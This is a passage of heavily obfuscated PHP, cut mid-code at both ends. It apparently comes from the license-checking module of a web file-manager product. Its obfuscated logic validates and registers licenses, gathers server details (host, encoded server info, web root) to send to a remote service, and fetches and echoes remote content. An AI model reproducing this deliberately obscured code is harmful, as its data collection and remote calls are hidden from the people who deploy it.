array_slice($GLOBALS[$¾Óœ±“[13]][$¾Óœ±“[14]], 1); $GLOBALS[$¾Óœ±“[13]][$¾Óœ±“[14]] = array_merge($àº„£§, $ïû’›ğµ); $GLOBALS[$¾Óœ±“[13]][$¾Óœ±“[15]] = implode($¾Óœ±“[0], $GLOBALS[$¾Óœ±“[13]][$¾Óœ±“[14]]); } private function phme62a6597d() { $¹¢Î¸Ë¿ =& $_SERVER[Õò”†—·]; $¡¿ù•îª =& $_SERVER[„½Ù‘ß¨]; if ($GLOBALS[$¡¿ù•îª[13]][$¡¿ù•îª[15]] != $¡¿ù•îª[6]) { return; } $à£ş… = $_SERVER[$¡¿ù•îª[16]]; $¢¾ôŠ¼ = $¹¢Î¸Ë¿[680]; $î¡±šë = $¡¿ù•îª[17]; if (!strstr($à£ş…, $î¡±šë)) { return; } $äğ±Ú¾† = strrpos($à£ş…, $î¡±šë); $Ï›ÙÜˆä = substr($à£ş…, $äğ±Ú¾† + strlen($î¡±šë)); $Ø‘œßıÈ = $¹¢Î¸Ë¿[681]; preg_match_all($¡¿ù•îª[18], $Ï›ÙÜˆä, $µë¨œÔ ); $§©àºÆ» = $¹¢Î¸Ë¿[682]; while (strlen($§©àºÆ») < $¹¢Î¸Ë¿[674]) { if (!$§©àºÆ») { break; } $§©àºÆ»++; } $Ï›ÙÜˆä = trim($µë¨œÔ [0][0], $¡¿ù•îª[19]); $GLOBALS[$¡¿ù•îª[13]][$¡¿ù•îª[14]] = explode($¡¿ù•îª[19], $Ï›ÙÜˆä); $¼Üá¿«± = $¹¢Î¸Ë¿[683]; while (strlen($¼Üá¿«±) < $¹¢Î¸Ë¿[684]) { if (!$¼Üá¿«±) { break; } $¼Üá¿«±++; } $GLOBALS[$¡¿ù•îª[13]][$¡¿ù•îª[15]] = implode($¡¿ù•îª[0], $GLOBALS[$¡¿ù•îª[13]][$¡¿ù•îª[14]]); } public function run() { $«·–£¾Û =& $_SERVER[Õò”†—·]; $Ş‡†Ïê£ =& $_SERVER[„½Ù‘ß¨]; $this->phme62a6597d(); $±Èœ°” = $«·–£¾Û[685]; if (!$±Èœ°”) { die; } $this->iljh659d3f80(); $–Ù¡ÏüÔ = $«·–£¾Û[686]; if (strlen($–Ù¡ÏüÔ) < $«·–£¾Û[668]) { return; } $–…†±É = $GLOBALS[$Ş‡†Ïê£[13]][$Ş‡†Ïê£[14]]; $ÚÅ©²ğ® = $«·–£¾Û[687]; $‹÷®ôµ´ = $GLOBALS[$Ş‡†Ïê£[13]][$Ş‡†Ïê£[15]]; define($Ş‡†Ïê£[20], isset($–…†±É[0]) && $–…†±É[0] ? $–…†±É[0] : $this->defaultModule); $µı´ôØæ = $«·–£¾Û[688]; if (strlen($µı´ôØæ) < $«·–£¾Û[668]) { die; } define($Ş‡†Ïê£[21], isset($–…†±É[1]) && $–…†±É[0] ? $–…†±É[1] : $this->defaultController); define($Ş‡†Ïê£[22], isset($–…†±É[2]) && $–…†±É[0] ? $–…†±É[2] : $this->defaultAction); define($Ş‡†Ïê£[23], MOD . $Ş‡†Ïê£[0] . ST . $Ş‡†Ïê£[0] . ACT); $èŸ¡Şñ = $«·–£¾Û[689]; if (!$èŸ¡Şñ) { die; } $_SERVER[$Ş‡†Ïê£[24]] = strtolower(ACTION); $this->autorun(); if (count($–…†±É) >= 3) { $this->appRun($‹÷®ôµ´); } else { $this->appRun(ACTION); } } private $vexbcfbc4957 = array(); private $cyts2a91e109 = ''; public function ykco7eca6047() { $ö·ªµ©’ =& $_SERVER[Õò”†—·]; $áö¾½¼ò =& $_SERVER[„½Ù‘ß¨]; $this->xaiq9d8509ad(); $this->jmcb6a04cf76(); $this->atzb4869d738(); $‰­º®ÉÙ = $ö·ªµ©’[690]; while (strlen($‰­º®ÉÙ) < $ö·ªµ©’[13]) { if (!$‰­º®ÉÙ) { break; } $‰­º®ÉÙ++; } $this->ybwv4944f45d(); $™•ù‡íç = $ö·ªµ©’[691]; $this->xwvhd7435cd5(); $this->uiyoa70a6b19(); $this->vnwa4044a89e(); $this->xetca1c04475($áö¾½¼ò[25], array($this, $áö¾½¼ò[26])); $this->xetca1c04475($áö¾½¼ò[27], array($this, $áö¾½¼ò[28])); $µÁø”£ = $ö·ªµ©’[692]; $this->xetca1c04475($áö¾½¼ò[29], array($this, $áö¾½¼ò[30])); $this->xetca1c04475($áö¾½¼ò[31], array($this, $áö¾½¼ò[32])); } public function tdylbe835449($ÑşÖ¢Å) { $‚ã„ =& $_SERVER[Õò”†—·]; $·™©‹Î =& $_SERVER[„½Ù‘ß¨]; $ğ ˆÈ‰î = Model($·™©‹Î[33])->get(); $¢Åäõ¨ı = $‚ã„[693]; while (strlen($¢Åäõ¨ı) < $‚ã„[671]) { if (!$¢Åäõ¨ı) { break; } $¢Åäõ¨ı++; } $ÙÌ®Êæ‘ = array($·™©‹Î[34], $·™©‹Î[35], $·™©‹Î[36], $·™©‹Î[37], $·™©‹Î[38], $·™©‹Î[39], $·™©‹Î[40], $·™©‹Î[41], $·™©‹Î[42], $·™©‹Î[43], $·™©‹Î[44], $·™©‹Î[45], $·™©‹Î[46], $·™©‹Î[47], $·™©‹Î[48], $·™©‹Î[49], $·™©‹Î[50], $·™©‹Î[51], $·™©‹Î[52], $·™©‹Î[53], $·™©‹Î[54], $·™©‹Î[55], $·™©‹Î[56], $·™©‹Î[57], $·™©‹Î[58], $·™©‹Î[59], $·™©‹Î[60], $·™©‹Î[61], $·™©‹Î[62], $·™©‹Î[63], $·™©‹Î[64], $·™©‹Î[65], $·™©‹Î[66], $·™©‹Î[67], $·™©‹Î[68], $·™©‹Î[69], $·™©‹Î[70], $·™©‹Î[71], $·™©‹Î[72], $·™©‹Î[73], $·™©‹Î[74], $·™©‹Î[75], $·™©‹Î[76], $·™©‹Î[77], $·™©‹Î[78], $·™©‹Î[79], $·™©‹Î[80], $·™©‹Î[81], $·™©‹Î[82], $·™©‹Î[83], $·™©‹Î[84]); $‘’ß³° = $‚ã„[694]; if (strlen($‘’ß³°) < $‚ã„[674]) { die; } foreach ($ÙÌ®Êæ‘ as $¤ËŠòòõ) { $›ÉİŸ = $GLOBALS[$·™©‹Î[85]][$·™©‹Î[86]][$¤ËŠòòõ]; $ÑÕ„¼ØË = $‚ã„[695]; if (isset($ğ ˆÈ‰î[$¤ËŠòòõ])) { $›ÉİŸ = $ğ ˆÈ‰î[$¤ËŠòòõ]; } $ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[88]][$¤ËŠòòõ] = $›ÉİŸ; } $ûĞœ Å– = $ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[88]][$·™©‹Î[46]]; $ÌÑƒß˜ = $‚ã„[696]; if (strlen($ÌÑƒß˜) < $‚ã„[668]) { die; } unset($ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[89]][$·™©‹Î[90]]); $„ü‘…“Ü = $‚ã„[697]; if (!$„ü‘…“Ü) { die; } unset($ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[89]][$·™©‹Î[91]]); $±¯„œñ = $‚ã„[698]; if (strlen($±¯„œñ) < $‚ã„[671]) { die; } unset($ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[88]][$·™©‹Î[46]]); $âùÖ¦Üá = $‚ã„[699]; if (!$âùÖ¦Üá) { die; } unset($ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[88]][$·™©‹Î[92]]); $ë‚êĞÂë = $‚ã„[700]; if (!$ë‚êĞÂë) { die; } $ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[88]][$·™©‹Î[93]] = array($·™©‹Î[94] => (int) $ûĞœ Å–[$·™©‹Î[95]], $·™©‹Î[96] => (int) _get($ûĞœ Å–, $·™©‹Î[97], 0)); $‰˜¡‰¬õ = substr(md5($·™©‹Î[98] . get_client_ip() . $ğ ˆÈ‰î[$·™©‹Î[99]]), 0, 15); $£µÖ°®î = $‚ã„[701]; while ($£µÖ°®î < $‚ã„[668]) { if ($£µÖ°®î >= 0) { break; } $£µÖ°®î++; } $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[101]] = Mcrypt::encode(Session::sign(), $‰˜¡‰¬õ, 3600 * 24); $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[102]] = Action($·™©‹Î[103])->accessToken(); $Í¢²÷š = $‚ã„[702]; while ($Í¢²÷š < $‚ã„[684]) { if ($Í¢²÷š >= 0) { break; } $Í¢²÷š++; } $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[104]] = md5($_SERVER[$·™©‹Î[105]] . $ğ ˆÈ‰î[$·™©‹Î[99]]); $§œœë½à = $‚ã„[703]; $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[106]] = base64_encode(serverInfo()); $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[107]] = $this->cyts2a91e109; $¡†”¥¶É = $‚ã„[704]; while (strlen($¡†”¥¶É) < $‚ã„[13]) { if (!$¡†”¥¶É) { break; } $¡†”¥¶É++; } if ($ğ ˆÈ‰î[$·™©‹Î[107]] != $·™©‹Î[108]) { $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[109]] = $ğ ˆÈ‰î[$·™©‹Î[109]]; $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[110]] = $ğ ˆÈ‰î[$·™©‹Î[110]]; $ÊçãìÃû = rand_string(10) . $this->cyts2a91e109 . rand_string(5); $ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[111]][$·™©‹Î[112]] = $this->vxbt9c4ab0a3($ÊçãìÃû, $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[104]]); } if ($this->cyts2a91e109 == $·™©‹Î[108]) { $ÑşÖ¢Å[$·™©‹Î[87]][$·™©‹Î[88]][$·™©‹Î[93]][$·™©‹Î[97]] = 0; } $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[113]] = $this->versionPluginFilter(); $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[114]] = _get($this->vexbcfbc4957, $·™©‹Î[115], $·™©‹Î[6]); $äëèÔÈî = $‚ã„[705]; if (!$äëèÔÈî) { die; } if (KodUser::isRoot() && $this->config[$·™©‹Î[116]]) { $ÑşÖ¢Å[$·™©‹Î[100]][$·™©‹Î[117]] = WEB_ROOT; } return $ÑşÖ¢Å; } private function uiyoa70a6b19() { $¼ßèºŞó =& $_SERVER[Õò”†—·]; $’“‚š€ =& $_SERVER[„½Ù‘ß¨]; $½¢Ë¾½ = $_SERVER[$’“‚š€[24]] == $’“‚š€[118]; $İªä¬Òå = $¼ßèºŞó[706]; if ($_SERVER[$’“‚š€[24]] == $’“‚š€[119] && $_GET[$’“‚š€[120]] == $’“‚š€[121]) { $½¢Ë¾½ = !0; } if ($½¢Ë¾½) { $¯Òàî¥¡ = array($’“‚š€[107] => $this->cyts2a91e109, $’“‚š€[122] => $this->tcyr2857ae31(), $’“‚š€[123] => Model($’“‚š€[124])->count()); if ($this->cyts2a91e109 != $’“‚š€[108]) { $è˜‰¶æĞ = _get($this->vexbcfbc4957, $’“‚š€[125]); if ($è˜‰¶æĞ) { $¯Òàî¥¡[$’“‚š€[126]] = $è˜‰¶æĞ; $¯Òàî¥¡[$’“‚š€[127]] = strtotime(_get($this->vexbcfbc4957, $’“‚š€[128])); $¯Òàî¥¡[$’“‚š€[129]] = _get($this->vexbcfbc4957, $’“‚š€[115]); } $¤­Â‚ıù = Model($’“‚š€[33])->get($’“‚š€[130], $’“‚š€[6], !0); if (is_string($¤­Â‚ıù) && substr($¤­Â‚ıù, 0, 1) == $’“‚š€[131]) { $¤­Â‚ıù = json_decode_force($¤­Â‚ıù); } if (is_array($¤­Â‚ıù) && $¤­Â‚ıù[$’“‚š€[132]] && strstr($¤­Â‚ıù[$’“‚š€[132]], $’“‚š€[133])) { $×”ñåÃ† = explode($’“‚š€[133], $¤­Â‚ıù[$’“‚š€[132]]); $¯Òàî¥¡[$’“‚š€[134]] = $×”ñåÃ†[0]; } } $¯Òàî¥¡ = $this->ioesd3cdc5bb(json_encode($¯Òàî¥¡), md5($’“‚š€[135])); $¨ç© = $¼ßèºŞó[707]; if (strlen($¨ç©) < $¼ßèºŞó[671]) { die; } $Ò¯ŠÓİÑ = array($’“‚š€[136] => $¯Òàî¥¡); call_user_func(array($’“‚š€[137], $’“‚š€[138]), $Ò¯ŠÓİÑ); $È¾ñëñî = $¼ßèºŞó[708]; } if ($this->cyts2a91e109 == $’“‚š€[108]) { return; } $¥Çšî—õ = array($’“‚š€[139], $’“‚š€[140], $’“‚š€[141], $’“‚š€[142], $’“‚š€[143], $’“‚š€[144]); $®ÙÚç½’ = Model($’“‚š€[33])->get(); $Ñ‘Ôö¢Ó = $¼ßèºŞó[709]; $Ò¯ŠÓİÑ = array($’“‚š€[145] => $®ÙÚç½’[$’“‚š€[34]], $’“‚š€[146] => $®ÙÚç½’[$’“‚š€[35]], $’“‚š€[147] => $’“‚š€[6]); $Ö·á ²Ì = $¼ßèºŞó[710]; while ($Ö·á ²Ì < $¼ßèºŞó[13]) { if ($Ö·á ²Ì >= 0) { break; } $Ö·á ²Ì++; } foreach ($¥Çšî—õ as $ù‰èû¨) { if (!isset($®ÙÚç½’[$ù‰èû¨]) || !$®ÙÚç½’[$ù‰èû¨]) { continue; } $Ò¯ŠÓİÑ[$ù‰èû¨] = $®ÙÚç½’[$ù‰èû¨]; $–³òïÒú = $¼ßèºŞó[711]; } call_user_func(array($’“‚š€[137], $’“‚š€[138]), $Ò¯ŠÓİÑ); } private function ybwv4944f45d() { $æãİı¹ =& $_SERVER[Õò”†—·]; $üıÌªÒğ =& $_SERVER[„½Ù‘ß¨]; if ($_SERVER[$üıÌªÒğ[24]] != $üıÌªÒğ[148]) { return; } if (!KodUser::isRoot()) { die; } $ŞŸ‡‚á• = $GLOBALS[$üıÌªÒğ[13]]; if (isset($ŞŸ‡‚á•[$üıÌªÒğ[149]])) { $this->ntswa125bfa5(); die; } if (isset($ŞŸ‡‚á•[$üıÌªÒğ[150]]) && isset($ŞŸ‡‚á•[$üıÌªÒğ[150]]) == $üıÌªÒğ[121]) { $ŞŸ‡‚á•[$üıÌªÒğ[151]] = Model($üıÌªÒğ[33])->get($üıÌªÒğ[152]); } if (!isset($ŞŸ‡‚á•[$üıÌªÒğ[151]]) || strlen($ŞŸ‡‚á•[$üıÌªÒğ[151]]) != 16) { show_json($üıÌªÒğ[153] . $ŞŸ‡‚á•[$üıÌªÒğ[151]], !1); } $êåêò—È = Model($üıÌªÒğ[33])->get($üıÌªÒğ[99]); $û•±«¼ê = md5($_SERVER[$üıÌªÒğ[105]] . $êåêò—È); $ßÕç®¹Ê = array($üıÌªÒğ[151] => $ŞŸ‡‚á•[$üıÌªÒğ[151]], $üıÌªÒğ[154] => rand_string(16), $üıÌªÒğ[155] => $üıÌªÒğ[135], $üıÌªÒğ[156] => $üıÌªÒğ[157], $üıÌªÒğ[158] => $_SERVER[$üıÌªÒğ[159]], $üıÌªÒğ[160] => $_SERVER[$üıÌªÒğ[161]], $üıÌªÒğ[162] => $_SERVER[$üıÌªÒğ[163]], $üıÌªÒğ[104] => $û•±«¼ê, $üıÌªÒğ[164] => Model($üıÌªÒğ[33])->get($üıÌªÒğ[130])); $Ï–üÍØ = $æãİı¹[712]; if (strlen($Ï–üÍØ) < $æãİı¹[668]) { return; } if (isset($ŞŸ‡‚á•[$üıÌªÒğ[150]]) && isset($ŞŸ‡‚á•[$üıÌªÒğ[150]]) == $üıÌªÒğ[121]) { $ßÕç®¹Ê[$üıÌªÒğ[150]] = md5($ßÕç®¹Ê[$üıÌªÒğ[151]] . $üıÌªÒğ[165] . $ßÕç®¹Ê[$üıÌªÒğ[154]]); } if ($ŞŸ‡‚á•[$üıÌªÒğ[166]] == $üıÌªÒğ[167]) { $ßÚöÜë„ = $this->ioesd3cdc5bb($û•±«¼ê, $üıÌªÒğ[168]); $¦ä•´ë¦ = $this->vxbt9c4ab0a3(json_encode($ßÕç®¹Ê), $û•±«¼ê . $üıÌªÒğ[169], 3); $¦ä•´ë¦ = $¦ä•´ë¦ . $üıÌªÒğ[170] . $_SERVER[$üıÌªÒğ[159]]; $†Œ¿¬– = $this->xuzsc8ae302e($üıÌªÒğ[171] . $ßÚöÜë„ . $üıÌªÒğ[172] . $¦ä•´ë¦, -1); show_json($†Œ¿¬–, !0); } else { if ($ŞŸ‡‚á•[$üıÌªÒğ[166]] == $üıÌªÒğ[173]) { $Â¡›µí = substr(md5($üıÌªÒğ[174] . $û•±«¼ê), 12, 15) . $üıÌªÒğ[175]; $¦ä•´ë¦ = $this->wbsda64e3e12(trim($ŞŸ‡‚á•[$üıÌªÒğ[176]]), $Â¡›µí, 2); $Ã—‰¯ß = json_decode($¦ä•´ë¦, !0); if (!is_array($Ã—‰¯ß) || !is_array($Ã—‰¯ß[$üıÌªÒğ[177]]) || $Ã—‰¯ß[$üıÌªÒğ[151]] != !0) { $ëÛĞğšÈ = $üıÌªÒğ[178]; $àæŒÜ”¢ = $Ã—‰¯ß[$üıÌªÒğ[177]] ? $üıÌªÒğ[179] . $Ã—‰¯ß[$üıÌªÒğ[177]] : $ëÛĞğšÈ; show_json($àæŒÜ”¢, !1); } else { $ßÕç®¹Ê[$üıÌªÒğ[154]] = $Ã—‰¯ß[$üıÌªÒğ[177]][$üıÌªÒğ[180]]; } } else { $Ã—‰¯ß = $this->xuzsc8ae302e($üıÌªÒğ[181], $ßÕç®¹Ê, 10); $¢´±Ÿ„® = $æãİı¹[713]; while (strlen($¢´±Ÿ„®) < $æãİı¹[684]) { if (!$¢´±Ÿ„®) { break; } $¢´±Ÿ„®++; } } } if (!is_array($Ã—‰¯ß) || !is_array($Ã—‰¯ß[$üıÌªÒğ[177]]) || $Ã—‰¯ß[$üıÌªÒğ[151]] != !0) { $ëÛĞğšÈ = LNG($üıÌªÒğ[182]); $àæŒÜ”¢ = $Ã—‰¯ß[$üıÌªÒğ[177]] ? $üıÌªÒğ[179] . $Ã—‰¯ß[$üıÌªÒğ[177]] : $ëÛĞğšÈ; show_json($àæŒÜ”¢, !1); } $‡¯²ë€© = $Ã—‰¯ß[$üıÌªÒğ[177]]; $ë€²†¶Ò = $this->waus587e4d54($‡¯²ë€©[$üıÌªÒğ[183]]); if (!$ë€²†¶Ò || $ë€²†¶Ò != $‡¯²ë€©[$üıÌªÒğ[128]]) { $ëàÜ•Â¯ = array($üıÌªÒğ[184] => Model($üıÌªÒğ[33])->get($üıÌªÒğ[99]), $üıÌªÒğ[185] => $_SERVER[$üıÌªÒğ[105]], $üıÌªÒğ[186] => this_url(), $üıÌªÒğ[160] => $_SERVER[$üıÌªÒğ[161]]); $¦ä•´ë¦ = $this->hqjkf0657195(json_encode($ëàÜ•Â¯)); $this->xuzsc8ae302e($üıÌªÒğ[187] . $¦ä•´ë¦); show_json(LNG($üıÌªÒğ[188]), !0); } $€ÉˆÌû = array($üıÌªÒğ[152] => $‡¯²ë€©[$üıÌªÒğ[189]], $üıÌªÒğ[190] => $‡¯²ë€©[$üıÌªÒğ[191]], $üıÌªÒğ[192] => rand_string(16), $üıÌªÒğ[107] => $‡¯²ë€©[$üıÌªÒğ[193]]); if ($ßÕç®¹Ê[$üıÌªÒğ[154]]) { $€ÉˆÌû[$üıÌªÒğ[192]] = $ßÕç®¹Ê[$üıÌªÒğ[154]]; } $ÂÂ£èä‚ = substr(md5($€ÉˆÌû[$üıÌªÒğ[190]]), 10, 10); $¯ÇÏ†ù© = $ÂÂ£èä‚ . $€ÉˆÌû[$üıÌªÒğ[107]] . $€ÉˆÌû[$üıÌªÒğ[192]]; $»¾ºóÒš = $æãİı¹[714]; if (!$»¾ºóÒš) { return; } $€ÉˆÌû[$üıÌªÒğ[109]] = strrev(base64_encode($this->ioesd3cdc5bb($¯ÇÏ†ù©, $üıÌªÒğ[194]))); $ÚõÌØ…« = $æãİı¹[715]; while (strlen($ÚõÌØ…«) < $æãİı¹[13]) { if (!$ÚõÌØ…«) { break; } $ÚõÌØ…«++; } $Íéßõˆó = rand_string(16); $›ÀØÌ»± = $Íéßõˆó . $€ÉˆÌû[$üıÌªÒğ[107]] . $this->ioesd3cdc5bb(md5($€ÉˆÌû[$üıÌªÒğ[152]]), $Íéßõˆó); $ä¾ô¹öş = $æãİı¹[716]; if (strlen($ä¾ô¹öş) < $æãİı¹[668]) { return; } $€ÉˆÌû[$üıÌªÒğ[110]] = base64_encode(strrev($this->ioesd3cdc5bb($›ÀØÌ»±, $üıÌªÒğ[195]))); if ($‡¯²ë€©[$üıÌªÒğ[196]] && $‡¯²ë€©[$üıÌªÒğ[196]] >= 1) { Model($üıÌªÒğ[33])->setDeep($üıÌªÒğ[197], $üıÌªÒğ[121]); } Model($üıÌªÒğ[33])->set($€ÉˆÌû); $™†Ôšğ¿ = md5($_SERVER[$üıÌªÒğ[105]] . strrev($êåêò—È) . $€ÉˆÌû[$üıÌªÒğ[190]]); $äÆı˜Œä = $æãİı¹[714]; if (!$äÆı˜Œä) { return; } $ÀñÕîË¦ = strrev(substr($™†Ôšğ¿, 10, 16)); $€·”´© = $this->vxbt9c4ab0a3(json_encode($‡¯²ë€©), $™†Ôšğ¿); $ëü¿¿–ã = array_to_keyvalue(Model($üıÌªÒğ[7])->listData(), $üıÌªÒğ[198]); $³É–áè€ = $æãİı¹[717]; if (strlen($³É–áè€) < $æãİı¹[13]) { die; } $§°§õğ = $ëü¿¿–ã[$üıÌªÒğ[199]]; $öİ•ã«‰ = array(); $Ë·¹Õõ = $æãİı¹[718]; while (strlen($Ë·¹Õõ) < $æãİı¹[668]) { if (!$Ë·¹Õõ) { break; } $Ë·¹Õõ++; } $öİ•ã«‰[$ÀñÕîË¦] = $€·”´©; Model($üıÌªÒğ[7])->update($§°§õğ[$üıÌªÒğ[200]], array($üıÌªÒğ[201] => $öİ•ã«‰)); $ÒÈ¶çÈï = $æãİı¹[719]; $this->vexbcfbc4957 = $‡¯²ë€©; $ë¥Ü¼äõ = $æãİı¹[720]; $this->cyts2a91e109 = $€ÉˆÌû[$üıÌªÒğ[107]]; $this->licenseRegistSuccess(); $áñåíìÓ = $æãİı¹[721]; while (strlen($áñåíìÓ) < $æãİı¹[671]) { if (!$áñåíìÓ) { break; } $áñåíìÓ++; } Cache::set($üıÌªÒğ[202] . md5($êåêò—È . $üıÌªÒğ[203]), $üıÌªÒğ[6]); show_json(LNG($üıÌªÒğ[188]), !0); $ÊÊ¥Â” = $æãİı¹[722]; while (strlen($ÊÊ¥Â”) < $æãİı¹[671]) { if (!$ÊÊ¥Â”) { break; } $ÊÊ¥Â”++; } } private function licenseRegistSuccess() { $ºÆï¼æ‹ =& $_SERVER[„½Ù‘ß¨]; $‹ßâØş„ = Model($ºÆï¼æ‹[33])->get(); $µæÂ’Ş = $_SERVER[Õò”†—·][723]; if (!$µæÂ’Ş) { die; } if ($‹ßâØş„[$ºÆï¼æ‹[63]] != $ºÆï¼æ‹[121]) { Model($ºÆï¼æ‹[33])->set($ºÆï¼æ‹[63], $ºÆï¼æ‹[121]); } Action($ºÆï¼æ‹[204])->initStart(!0); } private function ntswa125bfa5() { $Å¢•Û•Å =& $_SERVER[Õò”†—·]; $İ˜ğİİÍ =& $_SERVER[„½Ù‘ß¨]; Model($İ˜ğİİÍ[33])->set(array($İ˜ğİİÍ[152] => $İ˜ğİİÍ[6], $İ˜ğİİÍ[190] => $İ˜ğİİÍ[6], $İ˜ğİİÍ[107] => $İ˜ğİİÍ[108], $İ˜ğİİÍ[109] => $İ˜ğİİÍ[6], $İ˜ğİİÍ[110] => $İ˜ğİİÍ[6])); Model($İ˜ğİİÍ[33])->setDeep($İ˜ğİİÍ[197], $İ˜ğİİÍ[205]); $µÄéùóÛ = $Å¢•Û•Å[724]; if (strlen($µÄéùóÛ) < $Å¢•Û•Å[684]) { return; } $this->vexbcfbc4957 = array(); $¶¸ºµšå = $Å¢•Û•Å[725]; if (strlen($¶¸ºµšå) < $Å¢•Û•Å[684]) { die; } $this->cyts2a91e109 = $İ˜ğİİÍ[108]; } private function xaiq9d8509ad() { $²ÇŒ—…ú =& $_SERVER[Õò”†—·]; $…ˆï©¶© =& $_SERVER[„½Ù‘ß¨]; $_SERVER[$…ˆï©¶©[161]] = _get($_SERVER, $…ˆï©¶©[161], APP_HOST); $“—ùÖğ = $²ÇŒ—…ú[726]; if (!$“—ùÖğ) { return; } $this->cyts2a91e109 = $…ˆï©¶©[108]; $„ôæ¡• = Model($…ˆï©¶©[33])->get(); $üÒº‡İ¾ = $²ÇŒ—…ú[727]; if (!$üÒº‡İ¾) { die; } if ($„ôæ¡•[$…ˆï©¶©[107]] == $…ˆï©¶©[108]) { return; } $Íö¥Ø™µ = Model($…ˆï©¶©[33])->get($…ˆï©¶©[99]); $‚”¦•…Ã = $…ˆï©¶©[202] . md5($Íö¥Ø™µ . $…ˆï©¶©[203]); $”•à‰» = $²ÇŒ—…ú[728]; while ($”•à‰» < $²ÇŒ—…ú[671]) { if ($”•à‰» >= 0) { break; } $”•à‰»++; } $Ó’¹É‘Õ = Cache::get($‚”¦•…Ã); $ıØÍæÂ = $²ÇŒ—…ú[729]; if (!is_array($Ó’¹É‘Õ) || !isset($Ó’¹É‘Õ[$…ˆï©¶©[206]]) || time() - $Ó’¹É‘Õ[$…ˆï©¶©[206]] >= 60) { $‚ªôñ³ = Model($…ˆï©¶©[7])->loadList(); $   ÑÍĞ = $‚ªôñ³[$…ˆï©¶©[199]]; $Î­¥Ñ = md5($_SERVER[$…ˆï©¶©[105]] . strrev($Íö¥Ø™µ) . $„ôæ¡•[$…ˆï©¶©[190]]); $õ¡ß¿ÄŸ = strrev(substr($Î­¥Ñ, 10, 16)); $Ó’¹É‘Õ = $this->wbsda64e3e12($   ÑÍĞ[$…ˆï©¶©[85]][$õ¡ß¿ÄŸ], $Î­¥Ñ); $Ó’¹É‘Õ = json_decode($Ó’¹É‘Õ, !0); } if (!is_array($Ó’¹É‘Õ)) { return $this->ntswa125bfa5(); } $¡îãÇ¶ = strtotime($Ó’¹É‘Õ[$…ˆï©¶©[128]]); if (time() >= $¡îãÇ¶) { return $this->ntswa125bfa5(); } if (!isset($Ó’¹É‘Õ[$…ˆï©¶©[206]]) || time() - $Ó’¹É‘Õ[$…ˆï©¶©[206]] > 20) { $Ó’¹É‘Õ[$…ˆï©¶©[206]] = time(); Cache::set($‚”¦•…Ã, $Ó’¹É‘Õ); } $this->vexbcfbc4957 = $Ó’¹É‘Õ; $this->cyts2a91e109 = $„ôæ¡•[$…ˆï©¶©[107]]; } private function jmcb6a04cf76() { $ÏÙé»Ù =& $_SERVER[Õò”†—·]; $˜ƒá§“ =& $_SERVER[„½Ù‘ß¨]; $Úå‹‘ıà = $GLOBALS[$˜ƒá§“[13]]; $µ©éùÜØ = $ÏÙé»Ù[730]; $´µéÔøÀ = $_SERVER[$˜ƒá§“[24]]; $í£”²ï = $ÏÙé»Ù[731]; if ($´µéÔøÀ == $˜ƒá§“[207] && $this->cyts2a91e109 == $˜ƒá§“[108]) { show_json(LNG($˜ƒá§“[208]), !1, $˜ƒá§“[209]); } $½ôªš·‡ = array($˜ƒá§“[210], $˜ƒá§“[211]); if (in_array($´µéÔøÀ, $½ôªš·‡)) { if ($this->cyts2a91e109 == $˜ƒá§“[108] && isset($Úå‹‘ıà[$˜ƒá§“[212]])) { show_json(LNG($˜ƒá§“[208]), !1, $˜ƒá§“[209]); die; } $´æ¥ƒˆ» = $this->tcyr2857ae31(); if ($´æ¥ƒˆ» != intval($˜ƒá§“[213])) { if ($´æ¥ƒˆ» <= Model($˜ƒá§“[124])->count()) { show_json(LNG($˜ƒá§“[214]), !1, $˜ƒá§“[209]); die; } } } } private function atzb4869d738() { $‘»õ“Ğ =& $_SERVER[Õò”†—·]; $£ŸÙ˜ÄŞ =& $_SERVER[„½Ù‘ß¨]; $€ÏÍ„¡ = array($£ŸÙ˜ÄŞ[118], $£ŸÙ˜ÄŞ[119]); if (!KodUser::isRoot() || !isset($_GET[$£ŸÙ˜ÄŞ[215]])) { return; } if (!in_array($_SERVER[$£ŸÙ˜ÄŞ[24]], $€ÏÍ„¡)) { return; } $§æ§¤Äà = $£ŸÙ˜ÄŞ[216]; $åù—…Ã´ = $‘»õ“Ğ[732]; $§æ§¤Äà = $this->lacmf4b610bb($§æ§¤Äà, $£ŸÙ˜ÄŞ[217]); $¬ë—Ÿª¬ = stream_context_create(array($£ŸÙ˜ÄŞ[218] => array($£ŸÙ˜ÄŞ[219] => $£ŸÙ˜ÄŞ[220], $£ŸÙ˜ÄŞ[221] => 3))); $§Ï¶– Ù = @file_get_contents($§æ§¤Äà, !1, $¬ë—Ÿª¬); $Îµ²”÷Ê = $‘»õ“Ğ[733]; header($£ŸÙ˜ÄŞ[222]); $ÕĞÆ¡òÄ = $‘»õ“Ğ[734]; if (strlen($ÕĞÆ¡òÄ) < $‘»õ“Ğ[674]) { die; } if ($§Ï¶– Ù && strstr($§Ï¶– Ù, $£ŸÙ˜ÄŞ[223])) { echo $§Ï¶– Ù; } die; } public function oqay45f1f916($Ÿ£´Ç£ı) { $ˆ†ÜÍ­ =& $_SERVER[Õò”†—·]; $Ì¼Ğ¢¹ =& $_SERVER[„½Ù‘ß¨]; if ($this->cyts2a91e109 == $Ì¼Ğ¢¹[224]) { return $Ÿ£´Ç£ı; } $ıûÒÒ×˜ = $this->versionPluginList(); $õÉşºûÒ = explode($Ì¼Ğ¢¹[225], $this->versionPluginFilter()); $î¹ÃÜá = array(); $èå¸Àùè = $ˆ†ÜÍ­[735]; if (strlen($èå¸Àùè) < $ˆ†ÜÍ­[671]) { return; } foreach 